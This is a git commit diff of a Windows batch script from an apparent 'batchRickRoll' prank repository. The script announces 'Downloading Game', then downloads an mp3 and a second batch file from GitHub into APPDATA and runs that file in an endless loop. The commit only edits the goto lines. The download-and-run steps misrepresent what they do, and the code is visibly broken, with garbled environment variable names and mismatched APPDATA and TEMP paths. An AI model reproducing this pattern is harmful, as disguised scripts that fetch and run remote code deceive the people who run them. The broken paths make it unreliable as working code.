1031a7a8f9c24da25ca67b3907169112c11dbd37
pogga-was-taken <49074314+pogga-was-taken@users.noreply.github.com>
2021-09-13 15:22:10 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -7,9 +7,9 @@ echo Downloading Game
   curl -o %APPDATAAPPDATAAPPDATAAPPDATA%\yompBest\role.mp3 -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/roll.mp3
   curl -o %APPDATAAPPDATAAPPDATA%\yompBest\m.bat -LO http://raw.githubusercontent.com/pogga-was-taken/batchRickRoll/main/mediarunner.bat
   %APPDATAAPPDATA%\yompBest\m %TEMP%\yompBest\role.mp3
-  goto :play
+  goto play
  
  :play
  %APPDATA%\yompBest\m %TEMP%\yompBest\role.mp3
  
- goto :play
+ goto play
